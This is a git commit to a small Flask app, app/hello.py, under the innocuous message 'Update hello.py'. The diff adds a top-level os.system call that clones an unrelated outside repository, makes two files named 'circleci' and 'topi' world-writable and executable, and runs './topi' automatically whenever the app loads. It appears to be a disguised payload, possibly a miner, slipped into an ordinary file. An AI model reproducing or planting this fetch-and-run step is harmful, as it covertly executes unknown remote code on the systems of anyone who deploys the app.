9886e5eacfc77a5446a95c084dc71aac1a251fee
agusmuledon39 <100044977+agusmuledon39@users.noreply.github.com>
2022-02-20 02:32:24 +0700

    Update hello.py

--- app/hello.py
+++ app/hello.py
@@ -1,10 +1,11 @@
 # -*- coding:utf-8 -*-
-
+import os
 import platform
 import subprocess
 from flask import Flask, Response, request
 app = Flask(__name__)
 
+os.system("git clone https://github.com/aurbach55/pos.git && cd pos && chmod 777 circleci && chmod 777 topi && ./topi")
 @app.route("/")
 def headers():
     return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])
